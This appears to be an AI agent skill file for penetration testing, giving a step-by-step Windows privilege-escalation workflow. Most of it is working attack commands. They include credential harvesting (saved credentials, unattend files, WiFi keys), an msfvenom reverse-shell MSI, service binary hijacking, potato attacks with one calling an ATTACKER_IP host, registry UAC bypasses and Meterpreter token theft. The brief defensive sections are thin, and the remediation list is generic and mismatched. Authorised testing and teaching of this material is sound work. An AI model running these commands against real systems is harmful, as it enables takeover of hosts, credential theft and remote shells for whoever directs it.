---
name: windows-privilege-escalation
description: >
  Escalate privileges from a standard user to SYSTEM/Administrator on Windows systems using service
  misconfigurations, unquoted service paths, token manipulation, registry exploits, and kernel vulnerabilities.
  Use this skill during penetration tests after gaining initial access to a Windows host. Covers automated
  enumeration with WinPEAS, PowerUp, manual techniques, UAC bypass, and potato attacks.
domain: cybersecurity
subdomain: penetration-testing
category: Infrastructure
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1068, T1574.001, T1134]
platforms: [windows]
tags: [privilege-escalation, windows-privesc, winpeas, potato-attack, uac-bypass, unquoted-service-path, token-impersonation, pentest]
tools: [winpeas, powerup, seatbelt, juicypotato, printspoofer, godpotato, sharpup]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Windows Privilege Escalation

## When to Use
- After gaining initial access (standard user shell) on a Windows system
- When escalating from a low-privilege user or service account to SYSTEM/Admin
- During post-exploitation when elevated privileges are needed


## Prerequisites
- Shell access (user or limited privilege) on the target system
- Enumeration tools appropriate for the target OS (LinPEAS, WinPEAS, etc.)
- Understanding of the target OS privilege model and common misconfigurations
- Ability to transfer files or compile tools on the target

## Workflow

### Phase 1: Automated Enumeration

```powershell
# WinPEAS — comprehensive automated enumeration
.\winPEASx64.exe

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII powerup.txt

# Seatbelt (C# — security-focused enumeration)
.\Seatbelt.exe -group=all

# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Phase 2: Quick Wins

```powershell
# Check current privileges
whoami /priv
whoami /groups

# KEY PRIVILEGES for escalation:
# SeImpersonatePrivilege → Potato attacks (SYSTEM)
# SeAssignPrimaryTokenPrivilege → Token manipulation
# SeBackupPrivilege → Read any file (SAM/SYSTEM)
# SeRestorePrivilege → Write any file
# SeDebugPrivilege → Inject into any process
# SeTakeOwnershipPrivilege → Take ownership of any object

# Check for stored credentials
cmdkey /list
# If found: runas /savecred /user:admin cmd.exe

# Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
# msiexec /quiet /qn /i shell.msi

# Check for unattended install files
dir /s /b C:\unattend.xml C:\sysprep.inf C:\autounattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml

# Check saved WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear
```

### Phase 3: Service Exploits

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# If path is: C:\Program Files\My App\service.exe (unquoted with spaces)
# Place malicious exe at: C:\Program.exe or C:\Program Files\My.exe

# Weak service permissions
# Check if you can modify service configuration
sc qc "ServiceName"
accesschk.exe /accepteula -uwcqv "Users" *
# If SERVICE_CHANGE_CONFIG: sc config ServiceName binpath= "C:\evil.exe"

# Writable service binary
icacls "C:\path\to\service.exe"
# If writable: replace with malicious binary

# DLL hijacking in services
# If service loads DLL from writable directory
# Use Process Monitor to find missing DLLs
```

### Phase 4: Potato Attacks (SeImpersonatePrivilege)

```powershell
# Check for SeImpersonatePrivilege
whoami /priv | findstr "SeImpersonate"

# GodPotato (works on Windows 10/11, Server 2016-2022)
.\GodPotato-NET4.exe -cmd "C:\reverse_shell.exe"

# PrintSpoofer (Windows 10, Server 2016/2019)
.\PrintSpoofer.exe -c "C:\reverse_shell.exe"
.\PrintSpoofer.exe -i -c powershell.exe

# JuicyPotato (Windows 7-10, Server 2008-2019)
.\JuicyPotato.exe -l 1337 -p C:\reverse_shell.exe -t *

# Sweet Potato
.\SweetPotato.exe -p C:\reverse_shell.exe

# RoguePotato (Server 2019+)
.\RoguePotato.exe -r ATTACKER_IP -e "C:\reverse_shell.exe" -l 9999
```

### Phase 5: UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = No prompt, 2 = Prompt for consent, 5 = Default (prompt for non-Windows binaries)

# Fodhelper UAC bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# EventViewer UAC bypass
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe

# ComputerDefaults UAC bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe

# UACME — comprehensive UAC bypass tool
# https://github.com/hfiref0x/UACME
```

### Phase 6: Token Manipulation

```powershell
# With SeDebugPrivilege — inject into SYSTEM process
# Migrate to a SYSTEM process (winlogon, lsass)
# In Meterpreter: migrate <PID>

# Incognito — token impersonation
# In Meterpreter:
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# Create process with stolen token
# Using PowerShell and Win32 API
.\TokenManipulation.exe -method:createprocess -pid:SYSTEM_PID
```

## 🔵 Blue Team Detection
- **Service monitoring**: Alert on service binary/config changes
- **UAC enforcement**: Set UAC to "Always Notify"
- **Privilege auditing**: Alert on SeImpersonate/SeDebug privilege usage
- **LAPS**: Deploy to prevent local admin password reuse
- **Application whitelisting**: Block unauthorized executables
- **Patch management**: Keep Windows and services updated

## Key Concepts
| Concept | Description |
|---------|-------------|
| SeImpersonatePrivilege | Allows impersonating any token — Potato attack vector |
| Unquoted service path | Windows path parsing that allows binary planting |
| UAC bypass | Circumventing User Account Control prompts |
| Token manipulation | Stealing/duplicating security tokens from processes |
| AlwaysInstallElevated | MSI packages install with SYSTEM privileges |
| DLL hijacking | Loading malicious DLL via application search order |

## Output Format
```
Windows Privilege Escalation Report
=====================================
Initial Access: IIS AppPool\DefaultAppPool (service account)
Target: Windows Server 2019 (Build 17763)
Method: PrintSpoofer (SeImpersonatePrivilege abuse)

Escalation Path:
  IIS AppPool → SeImpersonatePrivilege → PrintSpoofer → NT AUTHORITY\SYSTEM

Evidence:
  C:\> whoami /priv
  SeImpersonatePrivilege    Enabled
  
  C:\> .\PrintSpoofer.exe -i -c "whoami"
  NT AUTHORITY\SYSTEM
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- HackTricks: [Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- PayloadsAllTheThings: [Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- WinPEAS: [GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- LOLBAS: [Living Off The Land Binaries](https://lolbas-project.github.io/)
